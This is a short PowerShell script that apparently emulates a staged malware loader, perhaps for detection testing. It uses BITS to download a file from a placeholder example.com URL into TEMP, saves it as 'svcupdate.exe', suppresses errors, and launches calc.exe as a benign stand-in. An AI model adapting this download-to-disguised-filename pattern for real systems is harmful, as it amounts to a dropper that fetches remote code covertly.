
[CmdletBinding()]
param(
    [string]$Stage2Url = "http://example.com/stage1.ps1",
    [string]$OutputPath = "$env:TEMP\svcupdate.exe",
    [int]$TimeoutSec = 86
)
Start-BitsTransfer -Source $Stage2Url -Destination $OutputPath -ErrorAction SilentlyContinue
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
